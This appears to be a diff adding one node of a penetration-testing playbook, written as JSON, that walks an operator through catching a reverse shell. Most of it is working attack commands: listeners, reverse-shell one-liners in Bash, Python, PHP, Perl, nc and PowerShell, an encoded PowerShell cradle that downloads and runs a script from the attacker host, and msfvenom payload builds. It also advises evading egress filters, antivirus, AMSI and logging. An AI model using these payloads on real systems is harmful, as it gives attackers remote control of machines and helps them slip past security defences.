@@ -1,0 +1,26 @@
+{
+  "id": "reverse_shell",
+  "phase": "SHELL",
+  "title": "Catch the Shell",
+  "body": "Listener first, then execute payload. Use 443 or 80 — egress filtering blocks high ports constantly. pwncat-cs auto-upgrades TTY. If the shell dies immediately, the issue is almost always the payload encoding or a filtered port.",
+  "cmd": "# -- LISTENERS ----------------------------\n# pwncat-cs (best — auto TTY, file transfer built in)\npwncat-cs -lp $lport\n\n# nc fallback\nnc -nlvp $lport\n\n# -- LINUX PAYLOADS ------------------------\n# Bash (most reliable on Linux)\nbash -i >& /dev/tcp/$lhost/$lport 0>&1\n# URL encoded version (for web shells/curl):\nbash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'\n\n# Python3\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Python2 fallback\npython -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# PHP (web context)\nphp -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n# Perl\nperl -e 'use Socket;$i=\"$lhost\";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n\n# nc with -e (if available)\nnc $lhost $lport -e /bin/bash\n\n# -- WINDOWS PAYLOADS ---------------------\n# PowerShell one-liner\npowershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()\"\n\n# PowerShell encoded (bypass execution policy + logging)\n# Generate: echo \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\" | iconv -t UTF-16LE | base64 -w0\npowershell -nop -w hidden -enc [BASE64]\n\n# msfvenom Windows stageless exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe\n# Staged (smaller, needs handler)\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o staged.exe\n\n# msfvenom Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf\n\n# Reference: https://www.revshells.com",
+  "warn": "Shell dies immediately? Check: (1) port reachable from target — try 443/80, (2) AV killing binary — use encoded payload or AMSI bypass, (3) bash not available — try sh or python, (4) /bin/bash path wrong — try /bin/sh.",
+  "choices": [
+    {
+      "label": "Shell caught — upgrade TTY",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Shell dies immediately — troubleshoot",
+      "next": "shell_troubleshoot"
+    },
+    {
+      "label": "AV killing binary — bypass needed",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Need meterpreter instead",
+      "next": "shell_meterpreter"
+    }
+  ]
+}
